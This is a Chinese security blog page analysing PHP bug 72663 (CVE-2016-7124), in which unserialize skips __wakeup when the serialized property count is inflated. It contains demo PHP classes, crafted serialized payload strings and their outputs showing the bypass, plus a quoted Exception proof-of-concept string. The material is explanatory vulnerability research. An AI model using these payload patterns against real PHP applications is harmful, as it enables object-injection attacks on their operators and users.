@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="default">
+<head>
+  <meta charset="utf-8">
+  
+  <title>php bugs 72663分析(CVE-2016-7124) | Hc1m1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前几天出了一个SugarCRM 6.5.23 - REST PHP Object Injection Exploit漏洞, 昨天360发了一篇分析文章, 什么狗屁, 看完了对php bugs 72663这个bug还是一堆疑问本文主要分析php bugs 72663这个bugSugarCRM的漏洞分析见p0wd3r的文章: http://paper.seebug.org/39/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php bugs 72663分析(CVE-2016-7124)">
+<meta property="og:url" content="http://0x48.pw/2016/09/13/0x22/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description" content="前几天出了一个SugarCRM 6.5.23 - REST PHP Object Injection Exploit漏洞, 昨天360发了一篇分析文章, 什么狗屁, 看完了对php bugs 72663这个bug还是一堆疑问本文主要分析php bugs 72663这个bugSugarCRM的漏洞分析见p0wd3r的文章: http://paper.seebug.org/39/">
+<meta property="og:updated_time" content="2016-09-13T10:25:30.848Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php bugs 72663分析(CVE-2016-7124)">
+<meta name="twitter:description" content="前几天出了一个SugarCRM 6.5.23 - REST PHP Object Injection Exploit漏洞, 昨天360发了一篇分析文章, 什么狗屁, 看完了对php bugs 72663这个bug还是一堆疑问本文主要分析php bugs 72663这个bugSugarCRM的漏洞分析见p0wd3r的文章: http://paper.seebug.org/39/">
+  
+    <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css" type="text/css">
+  
+  
+      <link href="//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css" rel="stylesheet">
+  
+  
+      <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+      <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+  
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css" type="text/css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+  
+  <script src="//cdn.bootcss.com/jquery/1.9.1/jquery.min.js" type="text/javascript"></script>
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false,
+      }
+  </script>
+
+  
+      <script>
+          yiliaConfig.rootUrl = "/";
+      </script>
+  
+
+  
+      <script>
+          var _hmt = _hmt || [];
+          (function() {
+              var hm = document.createElement("script");
+              hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+          })();
+      </script>
+  
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="http://qn.lazysheep.cc/img/author.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Hcamael</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Blog</p>
+        
+                
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/CBC-Padding-Oracle-Attack/" style="font-size: 10px;">CBC Padding Oracle Attack</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 16.67px;">Crypto</a> <a href="/tags/GIT/" style="font-size: 10px;">GIT</a> <a href="/tags/Old博文/" style="font-size: 10px;">Old博文</a> <a href="/tags/PWN/" style="font-size: 10px;">PWN</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Python/" style="font-size: 13.33px;">Python</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/SHA1-Length-Extension-Attack/" style="font-size: 10px;">SHA1 Length Extension Attack</a> <a href="/tags/SQLi/" style="font-size: 13.33px;">SQLi</a> <a href="/tags/Wechall/" style="font-size: 10px;">Wechall</a> <a href="/tags/php/" style="font-size: 13.33px;">php</a> <a href="/tags/安全研究/" style="font-size: 10px;">安全研究</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/检讨/" style="font-size: 10px;">检讨</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/网络/" style="font-size: 10px;">网络</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://evilddog.space">evilddog</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">脑子太蠢</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="http://qn.lazysheep.cc/img/author.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Blog</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-0x22" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/09/13/0x22/" class="article-date">
+      <time datetime="2016-09-13T03:11:11.000Z" itemprop="datePublished">2016-09-13</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      php bugs 72663分析(CVE-2016-7124)
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/H-blog/">H-blog</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/">php</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>前几天出了一个<code>SugarCRM 6.5.23 - REST PHP Object Injection Exploit</code>漏洞, 昨天360发了一篇分析文章, 什么狗屁, 看完了对php bugs 72663这个bug还是一堆疑问<br>本文主要分析php bugs 72663这个bug<br>SugarCRM的漏洞分析见p0wd3r的文章: <a href="http://paper.seebug.org/39/" target="_blank" rel="external">http://paper.seebug.org/39/</a></p>
+<a id="more"></a>
+<p>php bugs 72663: <a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="external">https://bugs.php.net/bug.php?id=72663</a><br>360 上分析的文章: <a href="http://bobao.360.cn/learning/detail/3020.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3020.html</a><br>PS:<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ php --<span class="built_in">version</span></span><br><span class="line">PHP <span class="number">7.0</span>.<span class="number">0</span> <span class="params">(cli)</span> <span class="params">(built: May <span class="number">15</span> <span class="number">2016</span> <span class="number">02</span>:<span class="number">41</span>:<span class="number">06</span>)</span> <span class="params">( NTS )</span></span><br><span class="line">Copyright <span class="params">(c)</span> <span class="number">1997</span>-<span class="number">2015</span> The PHP Group</span><br><span class="line">Zend Engine v3.<span class="number">0.0</span>, Copyright <span class="params">(c)</span> <span class="number">1998</span>-<span class="number">2015</span> Zend Technologies</span><br></pre></td></tr></table></figure></p>
+<p>下面这个是360这篇文章中给出的对<code>72663 bug</code>的测试代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$wanniba</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;wanniba = <span class="string">"*__destruct&lt;br /&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$this</span>-&gt;wanniba;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"__destruct OK!&lt;br /&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="variable">$this</span>-&gt;wanniba = <span class="string">"*__wakeup&lt;br /&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$this</span>-&gt;wanniba;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__wakeup OK!&lt;br /&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#$a = new test();</span></span><br><span class="line"><span class="comment">#echo serialize($a);</span></span><br><span class="line">  </span><br><span class="line"><span class="variable">$payload</span> = <span class="string">'O:4:"test":1:&#123;s:7:"wanniba";N;&#125;'</span>;</span><br><span class="line"><span class="variable">$payload1</span> = <span class="string">'O:4:"test":1:&#123;s:10:"\0*\0wanniba";N;&#125;'</span>;</span><br><span class="line"><span class="variable">$abc</span> = unserialize(<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$abc1</span> = unserialize(<span class="variable">$payload1</span>);</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="问题1">问题1</h3><p><code>\0*\0</code> 有何意义?<br>在php bugs原文里还有这里都出现了这个字符串, 那么这个字符串有何意义?<br>在上面的代码中<code>\0*\0</code>是处在单引号中, 在php里, 单引号中的为纯字符串, 所以这是5个字符<code>\</code>, <code>0</code>, <code>*</code>, <code>\</code>, <code>0</code>, 而不是<code>chr(0)+&#39;*&#39;+chr(0)</code><br>所以在上面的demo中<code>\0*\0wanniba</code>为12个字符, 而序列化前面的确是10, 这当然会反序列化失败, 而出现该结果<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">*__wakeup</span></span><br><span class="line">__wakeup OK!</span><br><span class="line"><span class="comment">*__destruct</span></span><br><span class="line">__destruct OK!</span><br><span class="line"></span><br><span class="line">Notice: unserialize(): <span class="keyword">Error</span> at offset 30 of 37 bytes <span class="keyword">in</span> /home/wwwroot/default/<span class="keyword">test</span>/test3.php <span class="keyword">on</span> <span class="keyword">line</span> 48</span><br><span class="line"><span class="comment">*__destruct</span></span><br><span class="line">__destruct OK!</span><br></pre></td></tr></table></figure></p>
+<p>按这篇文章来说, 如果这是正确结果的话, 那么我根本不需要<code>\0*\0</code>字符串, 只要<code>$payload1 = &#39;O:4:&quot;test&quot;:1:{s:10:&quot;wanniba&quot;;N;}&#39;;</code>， 就可以出现同样的结果</p>
+<p>所以又回到开头的问题上来了, <code>\0*\0</code>有何意义?</p>
+<p>在看看php bugs上的PoC: <code>$sess = &#39;O:9:&quot;Exception&quot;:2:{s:7:&quot;&#39;.&quot;\0&quot;.&#39;*&#39;.&quot;\0&quot;.&#39;file&quot;;R:1;}&#39;;</code></p>
+<p>从这可以很明显的看出, <code>\0*\0</code>是有意义的三个字符, 而不是上面代码中无意义的5个字符</p>
+<h3 id="问题2">问题2</h3><p>危害?<br>在上面问题没想清除的前提下, 我们假设上面代码的输出结果就是漏洞应该输出的结果, 那么危害是啥?<br>这稍微要设计到SugarCRM的这个漏洞, 从它的漏洞分析中我们可以猜测, 该漏洞的作用是在反序列化的过程中, 跳过<code>__wakeup</code>魔术方法, 然后直接执行<code>__destruct</code>, 然后<code>__destruct</code>魔术方法中有我们可控的部分</p>
+<p>然后我写了下面的demo:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$name</span>)</span> </span>&#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		var_dump(<span class="variable">$this</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;name = <span class="keyword">NULL</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"wakeup&lt;br/&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#$s = new Test("test1");</span></span><br><span class="line"><span class="comment">#$g = serialize($s);</span></span><br><span class="line"><span class="comment">#echo $g;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="string">'O:4:"Test":1:&#123;s:4:"name";s:5:"test1";&#125;'</span>;</span><br><span class="line"><span class="variable">$f2</span> = <span class="string">'O:4:"Test":1:&#123;s:5:"name";s:5:"test1";&#125;'</span>;</span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$f2</span>);</span></span><br></pre></td></tr></table></figure></p>
+<p>输出:<br><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wakeup</span><br><span class="line"><span class="keyword">object</span>(<span class="type">Test</span>)#<span class="number">2</span> (<span class="number">1</span>) &#123; [<span class="string">"name"</span>]=&gt; <span class="type">NULL</span> &#125;</span><br><span class="line"><span class="type">Notice</span>: unserialize<span class="literal">()</span>: <span class="type">Error</span> at offset <span class="number">24</span> <span class="keyword">of</span> <span class="number">38</span> <span class="built_in">bytes</span> <span class="keyword">in</span> /home/wwwroot/default/test/test3.php on line <span class="number">25</span></span><br><span class="line"><span class="keyword">object</span>(<span class="type">Test</span>)#<span class="number">1</span> (<span class="number">1</span>) &#123; [<span class="string">"name"</span>]=&gt; <span class="type">NULL</span> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后我们并没有办法控制<code>name</code>变量, 所以说这洞有啥用?</p>
+<hr>
+<p>看了p0wd3r的demo后, 终于懂了<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$age</span>;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$sex</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span>)</span> </span>&#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">		<span class="variable">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">		<span class="variable">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment"># var_dump($this);</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;name = <span class="keyword">NULL</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"wakeup&lt;br/&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Test(<span class="string">"Rem"</span>, <span class="number">14</span>, <span class="string">'girl'</span>);</span><br><span class="line"><span class="variable">$g</span> = serialize(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$g</span>;</span></span><br></pre></td></tr></table></figure></p>
+<p>在网页上看输出是:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">O</span>:<span class="value"><span class="number">4</span>:<span class="string">"Test"</span>:<span class="number">3</span>:&#123;s:<span class="number">10</span>:<span class="string">"Testname"</span></span></span>;<span class="rule"><span class="attribute">s</span>:<span class="value"><span class="number">3</span>:<span class="string">"Rem"</span></span></span>;<span class="rule"><span class="attribute">s</span>:<span class="value"><span class="number">6</span>:<span class="string">"*age"</span></span></span>;<span class="rule"><span class="attribute">i</span>:<span class="value"><span class="number">14</span></span></span>;<span class="rule"><span class="attribute">s</span>:<span class="value"><span class="number">3</span>:<span class="string">"sex"</span></span></span>;<span class="rule"><span class="attribute">s</span>:<span class="value"><span class="number">4</span>:<span class="string">"girl"</span></span></span>;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现奇怪的地方了, 然后<br><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = requests.get("http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/test/test3.php")</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r.content</span><br><span class="line">'\nO:<span class="number">4</span>:"Test":<span class="number">3</span>:&#123;s:<span class="number">10</span>:"\x00Test\x00name";s:<span class="number">3</span>:"<span class="comment">Rem";s:6:"\x00*\x00age";i:14;s:3:"sex";s:4:"girl";&#125;\n\n'</span></span><br></pre></td></tr></table></figure></p>
+<p>研究发现, <code>\x00 + 类名 + \x00 + 变量名</code> 反序列化出来的是<code>private</code>变量, <code>\x00 + * + \x00 + 变量名</code> 反序列化出来的是<code>protected</code>变量, 而直接变量名反序列化出来的是<code>public</code>变量, 好了, 现在第一个问题解决了</p>
+<p>下面是第二个问题,<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$age</span>;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$sex</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$sex</span>)</span> </span>&#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">		<span class="variable">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">		<span class="variable">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		var_dump(<span class="variable">$this</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;name = <span class="keyword">NULL</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"wakeup&lt;br/&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#$s = new Test("Rem", 14, 'girl');</span></span><br><span class="line"><span class="comment">#$g = serialize($s);</span></span><br><span class="line"><span class="comment">#echo $g;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="string">'O:4:"Test":3:&#123;s:10:"'</span>.<span class="string">"\0Test\0"</span>.<span class="string">'name";s:3:"Rem";s:6:"'</span>.<span class="string">"\0*\0"</span>.<span class="string">'age";i:14;s:3:"sex";s:4:"girl";&#125;'</span>;</span><br><span class="line"><span class="variable">$f2</span> = <span class="string">'O:4:"Test":4:&#123;s:10:"'</span>.<span class="string">"\0Test\0"</span>.<span class="string">'name";s:3:"Rem";s:6:"'</span>.<span class="string">"\0*\0"</span>.<span class="string">'age";i:14;s:3:"sex";s:4:"girl";&#125;'</span>;</span><br><span class="line"><span class="variable">$c</span> = unserialize(<span class="variable">$f</span>);</span><br><span class="line"><span class="variable">$c2</span> = unserialize(<span class="variable">$f2</span>);</span></span><br></pre></td></tr></table></figure></p>
+<p>输出结果<br><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wakeup</span><br><span class="line"></span><br><span class="line"><span class="type">Notice</span>: unserialize<span class="literal">()</span>: <span class="type">Unexpected</span> <span class="keyword">end</span> <span class="keyword">of</span> serialized data <span class="keyword">in</span> /home/wwwroot/default/test/test3.php on line <span class="number">29</span></span><br><span class="line"><span class="keyword">object</span>(<span class="type">Test</span>)#<span class="number">2</span> (<span class="number">3</span>) &#123; [<span class="string">"name"</span>:<span class="string">"Test"</span>:<span class="keyword">private</span>]=&gt; <span class="built_in">string</span>(<span class="number">3</span>) <span class="string">"Rem"</span> [<span class="string">"age"</span>:protected]=&gt; <span class="built_in">int</span>(<span class="number">14</span>) [<span class="string">"sex"</span>]=&gt; <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">"girl"</span> &#125;</span><br><span class="line"><span class="type">Notice</span>: unserialize<span class="literal">()</span>: <span class="type">Error</span> at offset <span class="number">81</span> <span class="keyword">of</span> <span class="number">83</span> <span class="built_in">bytes</span> <span class="keyword">in</span> /home/wwwroot/default/test/test3.php on line <span class="number">29</span></span><br><span class="line"><span class="keyword">object</span>(<span class="type">Test</span>)#<span class="number">1</span> (<span class="number">3</span>) &#123; [<span class="string">"name"</span>:<span class="string">"Test"</span>:<span class="keyword">private</span>]=&gt; <span class="type">NULL</span> [<span class="string">"age"</span>:protected]=&gt; <span class="built_in">int</span>(<span class="number">14</span>) [<span class="string">"sex"</span>]=&gt; <span class="built_in">string</span>(<span class="number">4</span>) <span class="string">"girl"</span> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>反序列化<code>$f</code> -&gt; 执行<code>__wakeup</code> -&gt; 反序列化<code>$f2</code> -&gt; 对象属性个数错误 -&gt; 销毁, 执行<code>__destruct</code> -&gt; 程序结束销毁<code>$c</code>, 执行<code>__destruct</code></p>
+<p>所以有了上面的输出结果</p>
